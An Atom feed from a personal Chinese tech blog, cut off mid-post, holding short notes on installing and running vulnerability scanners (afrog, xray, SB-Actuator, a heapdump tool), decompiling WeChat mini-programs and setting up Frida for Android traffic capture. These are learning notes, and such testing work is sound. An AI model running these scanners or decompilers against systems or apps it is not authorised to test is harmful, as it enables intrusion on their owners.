<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>绯鞠的博客</title>
  
  <subtitle>连蜜统治世界!!!💕</subtitle>
  <link href="https://loli.fj.cn/atom.xml" rel="self"/>
  
  <link href="https://loli.fj.cn/"/>
  <updated>2024-07-01T10:30:29.645Z</updated>
  <id>https://loli.fj.cn/</id>
  
  <author>
    <name>绯鞠</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【笔记】Afrog学习笔记</title>
    <link href="https://loli.fj.cn/2024/07/01/Afrog%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://loli.fj.cn/2024/07/01/Afrog%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2024-07-01T14:32:00.000Z</published>
    <updated>2024-07-01T10:30:29.645Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>A Security Tool for Bug Bounty, Pentest and Red Teaming（<a href="/302.html?target=https://github.com/zan8in/afrog">Github</a>）</p><span id="more"></span><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><h3 id="直接下载编译好的可执行文件"><a href="#直接下载编译好的可执行文件" class="headerlink" title="直接下载编译好的可执行文件"></a>直接下载编译好的可执行文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/zan8in/afrog/releases/download/v3.0.7/afrog_3.0.7_macOS_arm64.zip</span><br><span class="line">unzip afrog_3.0.7_macOS_arm64.zip -d afrog_3.0.7_macOS_arm64</span><br><span class="line">cd afrog_3.0.7_macOS_arm64</span><br></pre></td></tr></table></figure><h3 id="手动编译可执行文件"><a href="#手动编译可执行文件" class="headerlink" title="手动编译可执行文件"></a>手动编译可执行文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zan8in/afrog.git</span><br><span class="line">cd afrog</span><br><span class="line">go build cmd/afrog/main.go</span><br></pre></td></tr></table></figure><h2 id="扫描单个目标"><a href="#扫描单个目标" class="headerlink" title="扫描单个目标"></a>扫描单个目标</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afrog -t &lt;url&gt; -o &lt;file_name&gt;.html</span><br></pre></td></tr></table></figure><h2 id="扫描多个目标"><a href="#扫描多个目标" class="headerlink" title="扫描多个目标"></a>扫描多个目标</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afrog -T &lt;url&gt; -o &lt;file_name&gt;.html</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;A Security Tool for Bug Bounty, Pentest and Red Teaming（&lt;a href=&quot;/302.html?target=https://github.com/zan8in/afrog&quot;&gt;Github&lt;/a&gt;）&lt;/p&gt;</summary>
    
    
    
    
    <category term="Github" scheme="https://loli.fj.cn/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】Xray漏扫工具学习笔记</title>
    <link href="https://loli.fj.cn/2024/07/01/Xray%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://loli.fj.cn/2024/07/01/Xray%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2024-07-01T11:42:02.000Z</published>
    <updated>2024-07-01T10:30:29.729Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Xray漏扫工具学习笔记</p><span id="more"></span><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><ul><li>根据自己的平台下载对应的可执行文件</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/chaitin/xray/releases/download/1.9.11/xray_darwin_arm64.zip</span><br><span class="line">unzip xray_darwin_arm64.zip</span><br><span class="line">mv xray_darwin_arm64 xray</span><br></pre></td></tr></table></figure><h2 id="爬虫主动漏洞扫描"><a href="#爬虫主动漏洞扫描" class="headerlink" title="爬虫主动漏洞扫描"></a>爬虫主动漏洞扫描</h2><blockquote><p><code>&lt;url&gt;</code>：被扫描的站点<br><code>--html-output vuln.html</code>：输出的报告文件</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray webscan --basic-crawler &lt;url&gt; --html-output vuln.html</span><br></pre></td></tr></table></figure><h2 id="通过代理被动漏洞扫描"><a href="#通过代理被动漏洞扫描" class="headerlink" title="通过代理被动漏洞扫描"></a>通过代理被动漏洞扫描</h2><h3 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h3><blockquote><p><code>--html-output proxy.html</code>：输出的报告文件</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><h3 id="burp转发流量"><a href="#burp转发流量" class="headerlink" title="burp转发流量"></a>burp转发流量</h3><ul><li><code>Proxy</code>-&gt;<code>Proxy settings</code>-&gt;<code>Network</code>-&gt;<code>Connections</code>-&gt;在<code>Upstream proxy services</code>中<code>Add</code>配置-&gt;设置xray监听的端口-&gt;<code>OK</code></li></ul><p><img src="/images/20240701114202/01.webp"></p><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Xray漏扫工具学习笔记&lt;/p&gt;</summary>
    
    
    
    
    <category term="Github" scheme="https://loli.fj.cn/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】HeapdumpTool学习笔记</title>
    <link href="https://loli.fj.cn/2024/07/01/HeapdumpTool%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://loli.fj.cn/2024/07/01/HeapdumpTool%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2024-07-01T10:52:19.000Z</published>
    <updated>2024-07-01T10:30:29.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>利用<a href="/302.html?target=https://github.com/wyzxxz/heapdump_tool">wyzxxz&#x2F;heapdump_tool</a>实现heapdump漏洞扫描</p><span id="more"></span><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl-a.feejii.com/202407011054/4e195517dd91f4c8da1223e3abbfb411/storage/files/2024/05/21/3/5001040863/17162589083251.gz?filename=heapdump_tool.jar</span><br></pre></td></tr></table></figure><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><blockquote><p><code>&lt;file&gt;</code>：被扫描的heapdump文件</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar heapdump_tool.jar &lt;file&gt;</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;利用&lt;a href=&quot;/302.html?target=https://github.com/wyzxxz/heapdump_tool&quot;&gt;wyzxxz&amp;#x2F;heapdump_tool&lt;/a&gt;实现heapdump漏洞扫描&lt;/p&gt;</summary>
    
    
    
    
    <category term="Github" scheme="https://loli.fj.cn/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>【踩坑】Hexo部署Melody主题时报错</title>
    <link href="https://loli.fj.cn/2024/06/30/Hexo%E9%83%A8%E7%BD%B2Melody%E4%B8%BB%E9%A2%98%E6%97%B6%E6%8A%A5%E9%94%99/"/>
    <id>https://loli.fj.cn/2024/06/30/Hexo%E9%83%A8%E7%BD%B2Melody%E4%B8%BB%E9%A2%98%E6%97%B6%E6%8A%A5%E9%94%99/</id>
    <published>2024-06-30T22:29:09.000Z</published>
    <updated>2024-07-01T10:30:29.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Hexo部署Melody主题时报错：<code>extends includes/layout.pug block content include includes/recent-posts.pug include includes/pagination.pug</code></p><span id="more"></span><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><ul><li>下载缺少的依赖</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="/302.html?target=https://molunerfinn.com/hexo-theme-melody-doc/quick-start.html#setup">Melody主题官方文档</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Hexo部署Melody主题时报错：&lt;code&gt;extends includes/layout.pug block content include includes/recent-posts.pug include includes/pagination.pug&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Hexo" scheme="https://loli.fj.cn/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>【踩坑】Nodejs编译项目时报错内存不足</title>
    <link href="https://loli.fj.cn/2024/06/30/Nodejs%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE%E6%97%B6%E6%8A%A5%E9%94%99%E5%86%85%E5%AD%98%E4%B8%8D%E8%B6%B3/"/>
    <id>https://loli.fj.cn/2024/06/30/Nodejs%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE%E6%97%B6%E6%8A%A5%E9%94%99%E5%86%85%E5%AD%98%E4%B8%8D%E8%B6%B3/</id>
    <published>2024-06-30T20:57:11.000Z</published>
    <updated>2024-07-01T10:30:29.701Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Nodejs编译项目时报错：<code>Reached heap limit Allocation failed - JavaScript heap out of memory</code></p><span id="more"></span><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export NODE_OPTIONS=&quot;--max-old-space-size=8192&quot;</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="/302.html?target=https://blog.csdn.net/ZYC88888/article/details/120543578">CSDN——ZhaoYingChao88</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Nodejs编译项目时报错：&lt;code&gt;Reached heap limit Allocation failed - JavaScript heap out of memory&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Nodejs" scheme="https://loli.fj.cn/tags/Nodejs/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】SBActuator学习笔记</title>
    <link href="https://loli.fj.cn/2024/06/30/SBActuator%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://loli.fj.cn/2024/06/30/SBActuator%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2024-06-30T12:17:49.000Z</published>
    <updated>2024-07-01T10:30:29.709Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过<a href="/302.html?target=https://github.com/rabbitmask/SB-Actuator">rabbitmask&#x2F;SB-Actuator</a>实现Java的SpringBoot框架未授权访问漏洞、XXE漏洞、RCE漏洞扫描</p><span id="more"></span><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rabbitmask/SB-Actuator.git</span><br><span class="line">cd SB-Actuator</span><br></pre></td></tr></table></figure><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar SB-Actuator.jar -u http://&lt;ip&gt;:&lt;port&gt;</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;通过&lt;a href=&quot;/302.html?target=https://github.com/rabbitmask/SB-Actuator&quot;&gt;rabbitmask&amp;#x2F;SB-Actuator&lt;/a&gt;实现Java的SpringBoot框架未授权访问漏洞、XXE漏洞、RCE漏洞扫描&lt;/p&gt;</summary>
    
    
    
    
    <category term="Github" scheme="https://loli.fj.cn/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】JVM的OQL</title>
    <link href="https://loli.fj.cn/2024/06/29/JVM%E7%9A%84OQL/"/>
    <id>https://loli.fj.cn/2024/06/29/JVM%E7%9A%84OQL/</id>
    <published>2024-06-29T18:13:13.000Z</published>
    <updated>2024-07-01T10:30:29.681Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>JVM的OQL</p><span id="more"></span><h2 id="模糊搜索关键字"><a href="#模糊搜索关键字" class="headerlink" title="模糊搜索关键字"></a>模糊搜索关键字</h2><blockquote><p><code>&lt;str&gt;</code>：关键字</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select s from java.lang.String s where /&lt;str&gt;/.test(s.value.toString())</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;JVM的OQL&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【笔记】微信小程序反编译</title>
    <link href="https://loli.fj.cn/2024/06/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    <id>https://loli.fj.cn/2024/06/29/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/</id>
    <published>2024-06-29T17:11:13.000Z</published>
    <updated>2024-07-01T10:30:29.745Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>微信小程序反编译</p><span id="more"></span><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/sanriqing/WxAppUnpacker.git</span><br><span class="line">cd WxAppUnpacker</span><br></pre></td></tr></table></figure><h2 id="下载依赖"><a href="#下载依赖" class="headerlink" title="下载依赖"></a>下载依赖</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -f package-lock.json</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><h2 id="获取微信小程序的包"><a href="#获取微信小程序的包" class="headerlink" title="获取微信小程序的包"></a>获取微信小程序的包</h2><p><a href="/2024/06/29/%E8%8E%B7%E5%8F%96%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8FAPPID%E5%92%8C%E6%89%93%E5%8C%85%E5%90%8E%E7%9A%84wxapkg%E5%8C%85%E6%96%87%E4%BB%B6/">传送门</a></p><h2 id="反编译微信小程序的包"><a href="#反编译微信小程序的包" class="headerlink" title="反编译微信小程序的包"></a>反编译微信小程序的包</h2><blockquote><p><code>&lt;base_dir&gt;</code>：项目根目录</p></blockquote><h3 id="进入项目目录下反编译"><a href="#进入项目目录下反编译" class="headerlink" title="进入项目目录下反编译"></a>进入项目目录下反编译</h3><blockquote><p><code>-s=&lt;base_dir&gt;</code>：指定项目根目录</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node wuWxapkg.js &lt;file_name&gt;.wxapkg</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;微信小程序反编译&lt;/p&gt;</summary>
    
    
    
    
    <category term="Github" scheme="https://loli.fj.cn/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】获取微信小程序APPID和打包后的wxapkg包文件</title>
    <link href="https://loli.fj.cn/2024/06/29/%E8%8E%B7%E5%8F%96%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8FAPPID%E5%92%8C%E6%89%93%E5%8C%85%E5%90%8E%E7%9A%84wxapkg%E5%8C%85%E6%96%87%E4%BB%B6/"/>
    <id>https://loli.fj.cn/2024/06/29/%E8%8E%B7%E5%8F%96%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8FAPPID%E5%92%8C%E6%89%93%E5%8C%85%E5%90%8E%E7%9A%84wxapkg%E5%8C%85%E6%96%87%E4%BB%B6/</id>
    <published>2024-06-29T15:40:44.000Z</published>
    <updated>2024-07-01T10:30:29.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>获取微信小程序APPID和打包后的wxapkg包文件</p><span id="more"></span><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><ul><li><code>~\Documents\Wechat Files\Applet</code></li></ul><h2 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h2><ul><li><code>~/Library/Containers/com.tencent.xinWeChat/Data/.wxapplet/packages</code></li></ul><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><ul><li><p>Android上不能通过目录名获得小程序APPID</p></li><li><p><code>/data/data/com.tencent.mm/MicroMsg/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/appboard/pkg</code></p></li></ul><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="/302.html?target=https://www.jianshu.com/p/0617ee1ce641">简书——虚无void</a><br><a href="https://cloud.tencent.com/developer/article/2327496">腾讯云开发者社区——乌鸦安全</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;获取微信小程序APPID和打包后的wxapkg包文件&lt;/p&gt;</summary>
    
    
    
    
    <category term="MacOS" scheme="https://loli.fj.cn/tags/MacOS/"/>
    
    <category term="Windows" scheme="https://loli.fj.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】Encrypto命令行工具</title>
    <link href="https://loli.fj.cn/2024/06/28/Encrypto%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7/"/>
    <id>https://loli.fj.cn/2024/06/28/Encrypto%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7/</id>
    <published>2024-06-28T15:44:12.000Z</published>
    <updated>2024-07-01T10:30:29.661Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>使用<a href="/302.html?target=https://macpaw.com/encrypto">MacPaw Encrypto</a>官方的<a href="https://github.com/MacPaw/homebrew-taps">命令行工具</a>加解密文件，等同于使用 Mac App Store 的<a href="https://apps.apple.com/us/app/encrypto-secure-your-files/id935235287">Encrypto.app</a>加解密</p><span id="more"></span><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/MacPaw/homebrew-taps/raw/binaries/encrypto-cli.bundle-0.0.1.zip</span><br><span class="line">unzip encrypto-cli.bundle-0.0.1.zip</span><br><span class="line">mv encrypto-cli/encrypto-cli.bundle ./</span><br><span class="line">rm -rf encrypto-cli</span><br></pre></td></tr></table></figure><h2 id="加密文件"><a href="#加密文件" class="headerlink" title="加密文件"></a>加密文件</h2><blockquote><p><code>&lt;file_name&gt;</code>：指定未加密的文件<br><code>--output ./</code>：指定输出目录</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encrypto-cli.bundle/Contents/MacOS/encrypto-cli encrypt &lt;file_name&gt; --output ./</span><br></pre></td></tr></table></figure><ul><li>定义提示信息和密码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Enter hint 👉  </span><br><span class="line">Enter password 🤐  </span><br><span class="line">Verify password 🕵  </span><br><span class="line">encrypto-cli: 🤔  encrypting... 100%</span><br><span class="line">encrypto-cli: 😎  encrypting completed with file at path:</span><br></pre></td></tr></table></figure><h2 id="解密文件"><a href="#解密文件" class="headerlink" title="解密文件"></a>解密文件</h2><blockquote><p><code>&lt;file_name&gt;.crypto</code>：指定已加密的文件<br><code>--output ./</code>：指定输出目录</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encrypto-cli.bundle/Contents/MacOS/encrypto-cli decrypt &lt;file_name&gt;.crypto --output ./</span><br></pre></td></tr></table></figure><ul><li>输入密码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Enter password 🤐  </span><br><span class="line">encrypto-cli: 🤔  decrypting... 100%</span><br><span class="line">encrypto-cli: 😎  decrypting completed with file at path:</span><br></pre></td></tr></table></figure><h2 id="查看提示信息"><a href="#查看提示信息" class="headerlink" title="查看提示信息"></a>查看提示信息</h2><blockquote><p><code>&lt;file_name&gt;.crypto</code>：指定已加密的文件</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encrypto-cli.bundle/Contents/MacOS/encrypto-cli preview &lt;file_name&gt;.crypto</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encrypto-cli: 😉  .crypto hint: </span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://github.com/MacPaw/homebrew-taps/blob/master/Formula/encrypto-cli.rb">MacPaw&#x2F;homebrew-taps</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;使用&lt;a href=&quot;/302.html?target=https://macpaw.com/encrypto&quot;&gt;MacPaw Encrypto&lt;/a&gt;官方的&lt;a href=&quot;https://github.com/MacPaw/homebrew-taps&quot;&gt;命令行工具&lt;/a&gt;加解密文件，等同于使用 Mac App Store 的&lt;a href=&quot;https://apps.apple.com/us/app/encrypto-secure-your-files/id935235287&quot;&gt;Encrypto.app&lt;/a&gt;加解密&lt;/p&gt;</summary>
    
    
    
    
    <category term="MacOS" scheme="https://loli.fj.cn/tags/MacOS/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】Android四层协议和五层协议抓包</title>
    <link href="https://loli.fj.cn/2024/06/28/Android%E5%9B%9B%E5%B1%82%E5%8D%8F%E8%AE%AE%E5%92%8C%E4%BA%94%E5%B1%82%E5%8D%8F%E8%AE%AE%E6%8A%93%E5%8C%85/"/>
    <id>https://loli.fj.cn/2024/06/28/Android%E5%9B%9B%E5%B1%82%E5%8D%8F%E8%AE%AE%E5%92%8C%E4%BA%94%E5%B1%82%E5%8D%8F%E8%AE%AE%E6%8A%93%E5%8C%85/</id>
    <published>2024-06-28T10:44:35.000Z</published>
    <updated>2024-07-01T10:30:29.645Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>利用<a href="/302.html?target=https://github.com/frida/frida">frida&#x2F;frida</a>和<a href="https://github.com/r0ysue/r0capture">r0ysue&#x2F;r0capture</a>实现Android四层协议和五层协议抓包</p><span id="more"></span><h2 id="Frida环境配置"><a href="#Frida环境配置" class="headerlink" title="Frida环境配置"></a>Frida环境配置</h2><ul><li>Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.（<a href="https://github.com/frida/frida">Github</a>）</li><li>用于将Android的TCP端口转发到PC的TCP端口</li></ul><h3 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/frida/frida.git</span><br><span class="line">cd frida</span><br></pre></td></tr></table></figure><h3 id="下载依赖"><a href="#下载依赖" class="headerlink" title="下载依赖"></a>下载依赖</h3><h4 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv venv</span><br><span class="line">source venv/bin/activate</span><br></pre></td></tr></table></figure><h4 id="下载工集"><a href="#下载工集" class="headerlink" title="下载工集"></a>下载工集</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install frida-tools</span><br></pre></td></tr></table></figure><h4 id="下载Client"><a href="#下载Client" class="headerlink" title="下载Client"></a>下载Client</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install frida</span><br></pre></td></tr></table></figure><h5 id="手动指定版本"><a href="#手动指定版本" class="headerlink" title="手动指定版本"></a>手动指定版本</h5><ul><li>为了与Server版本保持一致，可以手动指定版本</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install frida==16.3.3</span><br></pre></td></tr></table></figure><h3 id="下载对应版本的"><a href="#下载对应版本的" class="headerlink" title="下载对应版本的"></a>下载对应版本的</h3><h4 id="查看Android的架构"><a href="#查看Android的架构" class="headerlink" title="查看Android的架构"></a>查看Android的架构</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure><h4 id="根据Android架构和Client版本下载对应版本的Server"><a href="#根据Android架构和Client版本下载对应版本的Server" class="headerlink" 